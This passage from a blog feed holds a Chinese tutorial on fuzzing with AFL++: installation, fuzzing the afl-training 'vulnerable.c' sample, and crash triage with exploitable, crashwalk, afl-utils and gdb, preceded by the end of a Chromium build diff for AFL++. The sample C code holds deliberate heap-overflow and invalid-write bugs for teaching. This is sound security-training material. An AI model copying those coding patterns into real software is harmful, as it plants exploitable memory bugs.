class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs patch"><br><span class="hljs-comment">--- BUILD.gn.bak2022-03-11 09:57:06.393190381 +0800</span><br><span class="hljs-comment">+++ BUILD.gn2022-03-09 10:57:43.640532334 +0800</span><br><span class="hljs-meta">@@ -2,13 +2,10 @@</span><br> # Use of this source code is governed by a BSD-style license that can be<br> # found in the LICENSE file.<br> <br><span class="hljs-addition">+# Modified by Hanyu to fit AFLplusplus.</span><br><span class="hljs-addition">+</span><br> group(&quot;afl&quot;) &#123;<br>   deps = [<br><span class="hljs-deletion">-    &quot;:afl-cmin&quot;,</span><br><span class="hljs-deletion">-    &quot;:afl-fuzz&quot;,</span><br><span class="hljs-deletion">-    &quot;:afl-showmap&quot;,</span><br><span class="hljs-deletion">-    &quot;:afl-tmin&quot;,</span><br><span class="hljs-deletion">-    &quot;:afl_docs&quot;,</span><br>     &quot;:afl_runtime&quot;,<br>   ]<br> &#125;<br><span class="hljs-meta">@@ -32,19 +29,11 @@</span> source_set(&quot;afl_runtime&quot;) &#123;<br>     &quot;//build/config/gcc:symbol_visibility_hidden&quot;,<br>   ]<br> <br><span class="hljs-deletion">-  sources = [</span><br><span class="hljs-deletion">-    &quot;src/llvm_mode/afl-llvm-rt.o.c&quot;,</span><br><span class="hljs-deletion">-  ]</span><br><span class="hljs-addition">+  sources = [ &quot;src/afl-llvm-rt-lto.o&quot;,</span><br><span class="hljs-addition">+              &quot;src/afl-llvm-rt-64.o&quot;,</span><br><span class="hljs-addition">+            ]</span><br> &#125;<br> <br><span class="hljs-deletion">-afl_headers = [</span><br><span class="hljs-deletion">-  &quot;src/alloc-inl.h&quot;,</span><br><span class="hljs-deletion">-  &quot;src/config.h&quot;,</span><br><span class="hljs-deletion">-  &quot;src/debug.h&quot;,</span><br><span class="hljs-deletion">-  &quot;src/types.h&quot;,</span><br><span class="hljs-deletion">-  &quot;src/hash.h&quot;,</span><br><span class="hljs-deletion">-]</span><br><span class="hljs-deletion">-</span><br> config(&quot;afl-tool&quot;) &#123;<br>   cflags = [<br>     # Include flags from afl&#x27;s Makefile.<br><span class="hljs-meta">@@ -63,60 +52,4 @@</span> config(&quot;afl-tool&quot;) &#123;<br>     # we do not use. Therefore its value is unimportant.<br>     &quot;-DBIN_PATH=\&quot;$root_build_dir\&quot;&quot;,<br>   ]<br><span class="hljs-deletion">-&#125;</span><br><span class="hljs-deletion">-</span><br><span class="hljs-deletion">-copy(&quot;afl-cmin&quot;) &#123;</span><br><span class="hljs-deletion">-  # afl-cmin is a bash script used to minimize the corpus, therefore we can just</span><br><span class="hljs-deletion">-  # copy it over.</span><br><span class="hljs-deletion">-  sources = [</span><br><span class="hljs-deletion">-    &quot;src/afl-cmin&quot;,</span><br><span class="hljs-deletion">-  ]</span><br><span class="hljs-deletion">-  outputs = [</span><br><span class="hljs-deletion">-    &quot;$root_build_dir/&#123;&#123;source_file_part&#125;&#125;&quot;,</span><br><span class="hljs-deletion">-  ]</span><br><span class="hljs-deletion">-  deps = [</span><br><span class="hljs-deletion">-    &quot;:afl-showmap&quot;,</span><br><span class="hljs-deletion">-  ]</span><br><span class="hljs-deletion">-&#125;</span><br><span class="hljs-deletion">-</span><br><span class="hljs-deletion">-copy(&quot;afl_docs&quot;) &#123;</span><br><span class="hljs-deletion">-  # Copy the docs folder. This is so that we can use a real value for for</span><br><span class="hljs-deletion">-  # -DDOC_PATH when compiling.</span><br><span class="hljs-deletion">-  sources = [</span><br><span class="hljs-deletion">-    &quot;src/docs&quot;,</span><br><span class="hljs-deletion">-  ]</span><br><span class="hljs-deletion">-  outputs = [</span><br><span class="hljs-deletion">-    &quot;$root_build_dir/afl/&#123;&#123;source_file_part&#125;&#125;&quot;,</span><br><span class="hljs-deletion">-  ]</span><br><span class="hljs-deletion">-&#125;</span><br><span class="hljs-deletion">-</span><br><span class="hljs-deletion">-executable(&quot;afl-fuzz&quot;) &#123;</span><br><span class="hljs-deletion">-  # Used to fuzz programs.</span><br><span class="hljs-deletion">-  configs -= [ &quot;//build/config/sanitizers:default_sanitizer_flags&quot; ]</span><br><span class="hljs-deletion">-  configs += [ &quot;:afl-tool&quot; ]</span><br><span class="hljs-deletion">-</span><br><span class="hljs-deletion">-  sources = [</span><br><span class="hljs-deletion">-    &quot;src/afl-fuzz.c&quot;,</span><br><span class="hljs-deletion">-  ]</span><br><span class="hljs-deletion">-  sources += afl_headers</span><br><span class="hljs-deletion">-&#125;</span><br><span class="hljs-deletion">-</span><br><span class="hljs-deletion">-executable(&quot;afl-tmin&quot;) &#123;</span><br><span class="hljs-deletion">-  configs -= [ &quot;//build/config/sanitizers:default_sanitizer_flags&quot; ]</span><br><span class="hljs-deletion">-  configs += [ &quot;:afl-tool&quot; ]</span><br><span class="hljs-deletion">-</span><br><span class="hljs-deletion">-  sources = [</span><br><span class="hljs-deletion">-    &quot;src/afl-tmin.c&quot;,</span><br><span class="hljs-deletion">-  ]</span><br><span class="hljs-deletion">-  sources += afl_headers</span><br><span class="hljs-deletion">-&#125;</span><br><span class="hljs-deletion">-</span><br><span class="hljs-deletion">-executable(&quot;afl-showmap&quot;) &#123;</span><br><span class="hljs-deletion">-  configs -= [ &quot;//build/config/sanitizers:default_sanitizer_flags&quot; ]</span><br><span class="hljs-deletion">-  configs += [ &quot;:afl-tool&quot; ]</span><br><span class="hljs-deletion">-</span><br><span class="hljs-deletion">-  sources = [</span><br><span class="hljs-deletion">-    &quot;src/afl-showmap.c&quot;,</span><br><span class="hljs-deletion">-  ]</span><br><span class="hljs-deletion">-  sources += afl_headers</span><br><span class="hljs-deletion">-&#125;</span><br><span class="hljs-addition">+&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fuzzing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzzing</tag>
      
      <tag>Chromium</tag>
      
      <tag>afl</tag>
      
      <tag>pdfium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL++学习日志（一）开始Fuzz与crashes分析</title>
    <link href="/2021/03/12/Start-Fuzzing-and-crashes-analysis/"/>
    <url>/2021/03/12/Start-Fuzzing-and-crashes-analysis/</url>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p><code>American Fuzzy Lop plus plus (afl++)</code>是一个由社区驱动的开源工具，它结合了最新的模糊研究，使研究具有可比性，可重复性，可组合性，并且-最重要的是-<strong>可用的</strong>。它提供了多种新功能，例如，<code>Custom Mutator API</code>（传统的突变API）能够<strong>增加模糊测试处理策略</strong>，<strong>特定目标的变异</strong>也可以由经验丰富的安全测试人员编写。具体细节可以参阅<ahref="https://www.usenix.org/conference/woot20/presentation/fioraldi">AFL++: Combining Incremental Steps of Fuzzing Research</a>。</p><p>本文主要介绍如何使用AFL++快速开始Fuzz一个样例程序和对大量的Fuzzer-GeneratedCrashes进行分类以及部分工具的安装与使用，如有错漏，也请师傅们不吝赐教。</p><h1 id="afl的安装">AFL++的安装</h1><blockquote><p>American Fuzzy Lop plus plus (afl++) Release Version: 3.14c GithubVersion: 3.15a Repository: <ahref="https://github.com/AFLplusplus/AFLplusplus"class="uri">https://github.com/AFLplusplus/AFLplusplus</a> Doc: <ahref="https://aflplus.plus/" class="uri">https://aflplus.plus/</a></p></blockquote><p>最简单的当然就是使用Docker啦，直接一键pull就可以使用了，具体请参见<ahref="https://github.com/AFLplusplus/AFLplusplus/blob/stable/Dockerfile">Dockerfile</a>(一般情况下都够用了)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull aflplusplus/aflplusplus<br>docker run -ti -v /location/of/your/target:/src aflplusplus/aflplusplus<br></code></pre></td></tr></table></figure><p>或者手动安装依赖后下载源码编译构建。（建议下载最新版本的编译器）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install git build-essential curl libssl-dev sudo libtool libtool-bin libglib2.0-dev bison flex automake python3 python3-dev python3-setuptools libpixman-1-dev gcc-9-plugin-dev cgroup-tools \<br>clang-12 clang-tools-12 libc++-12-dev libc++1-12 libc++abi-12-dev libc++abi1-12 libclang-12-dev libclang-common-12-dev libclang-cpp12 libclang-cpp12-dev libclang1-12 liblld-12 liblld-12-dev liblldb-12 liblldb-12-dev libllvm12 libomp-12-dev libomp5-12 lld-12 lldb-12 llvm-12 llvm-12-dev llvm-12-linker-tools llvm-12-runtime llvm-12-tools python3-lldb-12<br></code></pre></td></tr></table></figure><p>有时你可能需要切换下软件的默认版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo update-alternatives --install /usr/bin/clang clang `which clang-12` 0<br>sudo update-alternatives --install /usr/bin/clang++ clang++ `which clang++-12` 0<br>sudo update-alternatives --install /usr/bin/llvm-config llvm-config `which llvm-config-12` 0<br>sudo update-alternatives --install /usr/bin/llvm-symbolizer llvm-symbolizer `which llvm-symbolizer-12` 0<br></code></pre></td></tr></table></figure><p>获取源码并编译安装。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/AFLplusplus/AFLplusplus<br>cd AFLplusplus<br>git checkout stable # 选择安装版本，默认为stable<br>make distrib # 安装包括qemu_mode, unicorn_mode等在内的所有模式<br>sudo make install<br></code></pre></td></tr></table></figure><p>make构建目标选择：</p><ul><li>all: just the main AFL++ binaries</li><li>binary-only: everything for binary-only fuzzing: qemu_mode,unicorn_mode, libdislocator, libtokencap</li><li>source-only: everything for source code fuzzing: instrumentation,libdislocator, libtokencap</li><li>distrib: everything (for both binary-only and source codefuzzing)</li><li>man: creates simple man pages from the help option of theprograms</li><li>install: installs everything you have compiled with the buildoptions above</li><li>clean: cleans everything compiled, not downloads (unless not on acheckout)</li><li>deepclean: cleans everything including downloads</li><li>code-format: format the code, do this before you commit and send aPR please!</li><li>tests: runs test cases to ensure that all features are still workingas they should</li><li>unit: perform unit tests (based on cmocka)</li><li>help: shows these build options</li></ul><p>构建选项：</p><ul><li>STATIC - compile AFL++ static</li><li>ASAN_BUILD - compiles with memory sanitizer for debug purposes</li><li>DEBUG - no optimization, -ggdb3, all warnings and -Werror</li><li>PROFILING - compile with profiling information (gprof)</li><li>INTROSPECTION - compile afl-fuzz with mutation introspection</li><li>NO_PYTHON - disable python support</li><li>NO_SPLICING - disables splicing mutation in afl-fuzz, notrecommended for normal fuzzing</li><li>AFL_NO_X86 - if compiling on non-intel/amd platforms</li><li>LLVM_CONFIG - if your distro doesn’t use the standard name forllvm-config (e.g. Debian)</li></ul><p>安装完成后的系统配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ~/AFLplusplus/afl-system-config #将降低系统的安全性，建议仅在docker中使用<br>ulimit -c 0 # 当程序crash时不产生core文件，在存在大量crashes的时候特别有用<br></code></pre></td></tr></table></figure><h1 id="开始fuzzing">开始Fuzzing</h1><p>相信很多人在刚开始的时候都会有下面两个问题（包括我）</p><ol type="1"><li>不熟悉模糊测试工具；</li><li>用模糊测试测试什么内容</li></ol><p>对于第一点，建议参阅<ahref="https://www.fuzzingbook.org/">FuzzingBook</a>和Sakura师傅的<ahref="https://www.anquanke.com/post/id/213430">AFL源码注释</a>，至于第二个，我建议的选择是类似于afl-training或者EkoParty_Advanced_Fuzzing_Workshop等学习类型的target，也是本系列文章的主要内容部分（后续实战目标的选择可以看我的博客）。</p><blockquote><p>Fuzzing with AFL workshop<br />Repository: <a href="https://github.com/mykter/afl-training"class="uri">https://github.com/mykter/afl-training</a><br />Doc: <ahref="https://github.com/mykter/afl-training/files/5454345/Fuzzing.with.AFL.-.GrayHat.2020.pdf"class="uri">https://github.com/mykter/afl-training/files/5454345/Fuzzing.with.AFL.-.GrayHat.2020.pdf</a><br />Docker: <a href="https://ghcr.io/mykter/fuzz-training"class="uri">https://ghcr.io/mykter/fuzz-training</a></p></blockquote><p>测试代码可以在此<ahref="https://raw.githubusercontent.com/mykter/afl-training/main/quickstart/vulnerable.c">下载</a>，核心函数代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">char</span> *input)</span><br>&#123;<br><span class="hljs-type">char</span> *out;<br><span class="hljs-type">char</span> *rest;<br><span class="hljs-type">int</span> len;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(input, <span class="hljs-string">&quot;u &quot;</span>, <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>)<br>&#123; <span class="hljs-comment">// upper case command</span><br><span class="hljs-type">char</span> *rest;<br>len = strtol(input + <span class="hljs-number">2</span>, &amp;rest, <span class="hljs-number">10</span>); <span class="hljs-comment">// how many characters of the string to upper-case</span><br>rest += <span class="hljs-number">1</span>;<span class="hljs-comment">// skip the first char (should be a space)</span><br>out = <span class="hljs-built_in">malloc</span>(len + <span class="hljs-built_in">strlen</span>(input));<span class="hljs-comment">// could be shorter, but play it safe</span><br><span class="hljs-keyword">if</span> (len &gt; (<span class="hljs-type">int</span>)<span class="hljs-built_in">strlen</span>(input))<br><span class="hljs-comment">/* skip */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i != len; i++)<br>&#123;<br><span class="hljs-type">char</span> c = rest[i];<br><span class="hljs-keyword">if</span> (c &gt; <span class="hljs-number">96</span> &amp;&amp; c &lt; <span class="hljs-number">123</span>) <span class="hljs-comment">// ascii a-z</span><br>&#123;<br>c -= <span class="hljs-number">32</span>;<br>&#125;<br>out[i] = c;<br>&#125;<br>out[len] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">strcat</span>(out, rest + len); <span class="hljs-comment">// append the remaining text</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, out);<br><span class="hljs-built_in">free</span>(out);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(input, <span class="hljs-string">&quot;head &quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>)<br>&#123; <span class="hljs-comment">// head command</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(input) &gt; <span class="hljs-number">6</span>)<br>&#123;<br>len = strtol(input + <span class="hljs-number">4</span>, &amp;rest, <span class="hljs-number">10</span>);<br>rest += <span class="hljs-number">1</span>;  <span class="hljs-comment">// skip the first char (should be a space)</span><br>rest[len] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">// truncate string at specified offset</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, rest);<br>&#125;<br><span class="hljs-comment">/* skip */</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(input, <span class="hljs-string">&quot;surprise!\n&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-comment">// easter egg!</span><br>*(<span class="hljs-type">char</span> *)<span class="hljs-number">1</span> = <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-comment">/* skip */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>使用afl-clang-fast进行编译，如提示命令未找到就将AFL++目录添加至PATH环境变量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-clang-fast -AFL_HARDEN=1 vulnerable.c -o vulnerable<br></code></pre></td></tr></table></figure><p>优先选择更好的插桩方式，若使用afl-cc会自动选择最合适的编译器。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs text">+--------------------------------+<br>| clang/clang++ 11+ is available | --&gt; use LTO mode (afl-clang-lto/afl-clang-lto++)<br>+--------------------------------+     see [instrumentation/README.lto.md](instrumentation/README.lto.md)<br>    |<br>    | if not, or if the target fails with LTO afl-clang-lto/++<br>    |<br>    v<br>+---------------------------------+<br>| clang/clang++ 3.8+ is available | --&gt; use LLVM mode (afl-clang-fast/afl-clang-fast++)<br>+---------------------------------+     see [instrumentation/README.llvm.md](instrumentation/README.llvm.md)<br>    |<br>    | if not, or if the target fails with LLVM afl-clang-fast/++<br>    |<br>    v<br> +--------------------------------+<br> | gcc 5+ is available            | -&gt; use GCC_PLUGIN mode (afl-gcc-fast/afl-g++-fast)<br> +--------------------------------+    see [instrumentation/README.gcc_plugin.md](instrumentation/README.gcc_plugin.md) and<br>                                       [instrumentation/README.instrument_list.md](instrumentation/README.instrument_list.md)<br>    |<br>    | if not, or if you do not have a gcc with plugin support<br>    |<br>    v<br>   use GCC mode (afl-gcc/afl-g++) (or afl-clang/afl-clang++ for clang)<br><br></code></pre></td></tr></table></figure><p>设置AFL_HARDEN会让调用的下游编译器自动化代码加固，使得检测简单的内存bug变得更加容易，但会减少5%左右的性能，关于AFL++的环境变量设置可以参阅<ahref="https://aflplus.plus/docs/env_variables/。"class="uri">https://aflplus.plus/docs/env_variables/。</a></p><p>使用afl-fuzz进行Fuzz，输入可以随意写，如<code>echo 1 &gt; inputs/1</code>，或带有源码中关键字的输入（推荐），如<code>echo "u 4 capsme" &gt; inputs/2</code>，但需保证输入必须能使程序正常运行（即不能一开始就整个crash）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir inputs<br>mkdir out<br>echo 1 &gt; inputs/1<br>echo &quot;u 4 capsme&quot; &gt; inputs/2<br>afl-fuzz -i inputs -o out ./vulnerable<br></code></pre></td></tr></table></figure><p>如果一切正常的话，睡个午觉之后你就能看见类似于如下的图：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/quickstart.png" /></p><p>每个独特的crash和命令参数都将存放在输出文件夹的crashes文件夹下，接下来就是对这些crash进行调试分析了。</p><h1 id="crashes分类与自动化分析">crashes分类与自动化分析</h1><p>在开始分析前请确保已安装gdb等常用二进制调试工具，我使用的是GDB的<ahref="https://github.com/hugsy/gef">gef插件</a>。</p><p>对crashes的分类包括调试分析Fuzz程序发现的每个crash以确定碰撞是否值得进一步分析（对安全研究人员而言，这通常意味着确定crash是否可能是由漏洞造成的），如果是，则确定crash的根本原因。详细地人工分析每一个crash都非常耗时耗力，尤其当Fuzzer已经识别出几十次或上百次crash时。</p><p>幸运的是现在已有许多可用于帮助分类或分析crash的技术和工具。虽然crashes的分类仍然可能是一个痛苦的过程，但下述的工具可以帮助减轻一些乏味的工作，至少也能大概确定最有可能触发安全相关问题的crash优先级。</p><h2 id="crash复现与初步分析">crash复现与初步分析</h2><p>首先我们来看看刚才得到的九个crash（这里只有八个的原因是我服务器崩了导致我重跑了一遍，但第九个crash怎么也出不来。。。。。。。。）</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310160024060.png" /></p><p>我们先用gdb简单调试下：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310161229664.png" /></p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310161327761.png" /></p><p>显然，我们能知道错误类型（在这种情况下为SIGSEV），发生错误的代码行（因为二进制文件是带调试信息编译的），造成崩溃的指令（<code>movdqu xmm2, XMMWORD PTR [r13+rdi*1+0x11]</code>，大概率是因为非法访问内存），backtrace以及其他诸如stack内容等信息。但逐个这样分析crash是一件很费时费力的工作，所以我们需要一些自动化工具来帮助我们进行分析。</p><h2 id="自动化工具的介绍和使用">自动化工具的介绍和使用</h2><blockquote><p>GDB ‘exploitable’ plugin<br />Repository: <a href="https://github.com/jfoote/exploitable"class="uri">https://github.com/jfoote/exploitable</a></p></blockquote><p>exploitable是一个gdb插件，安装请参见安装文档，它试图确定某个特定的crash是否可能可以被利用。该插件为各类程序状态提供了一系列的分类标准，如果程序处于可以被插件识别的状态，它将为该状态分配可利用性的分类。使用如下：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310163220227.png" /></p><p>此工具可以帮助用户优先分析那些最有可能被利用的crash，不太可能被利用的（或者插件无法分析的）可能仍然值得分析，但这是在调试了那些更有希望发现漏洞的crash之后。</p><hr /><blockquote><p>crashwalk<br />Repository: <a href="https://github.com/bnagy/crashwalk"class="uri">https://github.com/bnagy/crashwalk</a><br />Doc: <a href="https://pkg.go.dev/github.com/bnagy/crashwalk"class="uri">https://pkg.go.dev/github.com/bnagy/crashwalk</a></p></blockquote><p>Crashwalk是在exploitable插件基础上开发的一款工具。Crashwalk将遍历AFL生成的crashes并在crash状态下运行exploitable并生成一个crashwalk.db文件。</p><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">export CW_EXPLOITABLE=/path/to/exploitable.py<br>./cwtriage -root ./out/default/crashes/ -match id -- ./vulnerable<br></code></pre></td></tr></table></figure><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310164846659.png" /></p><p>使用cwdump获取摘要：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./cwdump ./crashwalk.db<br></code></pre></td></tr></table></figure><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310165705086.png" /></p><hr /><blockquote><p>afl-utils<br />Repository: <a href="https://gitlab.com/rc0r/afl-utils"class="uri">https://gitlab.com/rc0r/afl-utils</a><br />Docs: <a href="https://gitlab.com/rc0r/afl-utils/-/tree/master/docs"class="uri">https://gitlab.com/rc0r/afl-utils/-/tree/master/docs</a></p></blockquote><p>含有一系列协助Fuzzing的工具集合：</p><ul><li>自动crash样本收集，验证，过滤和分析（<code>afl-collect</code>，<code>afl-vcrash</code>）</li><li>轻松管理并行（多核）Fuzz测试作业（<code>afl-multicore</code>，<code>afl-multikill</code>）</li><li>语料库优化（<code>afl-minimize</code>）</li><li>Fuzz状态统计监督（<code>afl-stats</code>）</li><li>Fuzzer队列同步（<code>afl-sync</code>）</li><li>自主实用程序执行（<code>afl-cron</code>）</li></ul><p>其中afl-collect与crashwalk类似，也可调用exploitable进行简单分析并生成库，具体上篇文章已经介绍过了，不再赘述，直接上图：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310180108989.png" /></p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310180131008.png" /></p><p>可以看出afl-collect很快就统计了脚本数据并将crashes整合后复制到了输出文件夹，对比crashwalk的结果而言简明了很多。但需要注意的是，exploitable并没有考虑在现有防御机制下漏洞的利用难度，所以我们还需要使用下述工具来辅助我们进行分析。</p><hr /><blockquote><p>AFL crash exploration mode<br />Repository: <ahref="https://github.com/AFLplusplus/AFLplusplus#help-crash-triage"class="uri">https://github.com/AFLplusplus/AFLplusplus#help-crash-triage</a><br />Reference: <ahref="https://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html"class="uri">https://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html</a></p></blockquote><p>这是一种内置于AFL中的模式，Fuzzer将一个或多个导致crash的测试用例作为输入，并使用其feedback-drivenfuzzing策略在保持crash的情况下快速枚举程序中可以到达的所有代码路径。</p><p>一般而言，我们希望Fuzzer找到更多独特的crash而不是一次又一次的同类crashes。然而，正如文档中所指出的，这种模式的目的是创建一个小的crashes库从而可以快速地检查它来分析我们对漏洞的控制程度。例如，如果crash与写入地址有关，但我们无法控制该地址，那么这个就可能不是那么有用。另一方面，如果AFL的crashexploration模式确定我们可以通过更改输入来对任意地址执行写操作，那么我们就更有可能利用这个漏洞进行攻击。</p><p>我们将使用afl-fuzz生成的初始崩溃用例来启用崩溃探索模式，即将crashes目录作为输入并使用<code>-C</code>运行afl-fuzz：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -C -i out/default/crashes/ -o crash_exploration/ ./vulnerable<br></code></pre></td></tr></table></figure><p>当AFL开始以这种模式运行时，它将检查测试用例以确保它们导致crash，如下所示：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310172512489.png" /></p><p>在AFL的正常模式中，此步骤的目的是对测试用例进行检查以确保它们<strong>不会</strong>导致崩溃。AFL希望使用正常的测试文件来使程序按预期方式运行，以便可以对它们进行迭代以触发异常行为。相反，崩溃探索模式确保这些测试用例已经导致crash，因为它将尝试识别将导致相同状态的其他代码路径。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/image-20210310172616236.png" /></p><hr /><blockquote><p>Record and Replay Framework<br />Repository: <a href="https://github.com/rr-debugger/rr"class="uri">https://github.com/rr-debugger/rr</a><br />Doc: <a href="https://rr-project.org/"class="uri">https://rr-project.org/</a><br />Wiki: <a href="https://github.com/rr-debugger/rr/wiki"class="uri">https://github.com/rr-debugger/rr/wiki</a><br />Reference: <a href="https://arxiv.org/pdf/1705.05937.pdf">EngineeringRecord And Replay For Deployability Extended Technical Report</a></p></blockquote><p>需要Linux内核3.11或更高版本且<code>/proc/sys/kernel/perf_event_paranoid</code>必须小于等于1（即能够使用<code>perf</code>计数器）。详细要求请参阅<code>https://github.com/rr-debugger/rr/wiki/Building-And-Installing#hardwaresoftware-configuration</code>。我的服务器不符合要求，就在这里仅做个介绍推荐吧，有空再补（咕了</p><h1 id="对crash的简单调试">对crash的简单调试</h1><p>让我们从上面分完类的crashes中随机挑一个丢到gdb里去，在<code>strcat(out, rest + len);</code>处下个断点（当然在其他地方也可以，主要是这里的溢出点太明显了。。。。）</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/heap-view.png"alt="heap-view" /><figcaption aria-hidden="true">heap-view</figcaption></figure><p>可以看出来在执行strcat函数之前的堆还是十分正常的</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AFL++学习日志（一）开始Fuzz与crashes分析/heap-chunks.png"alt="heap-chunks" /><figcaption aria-hidden="true">heap-chunks</figcaption></figure><p>oops,溢出啦，让我们来看一下输入文件的内容</p><p><img lazyloadsrc="/img/loading.gif" 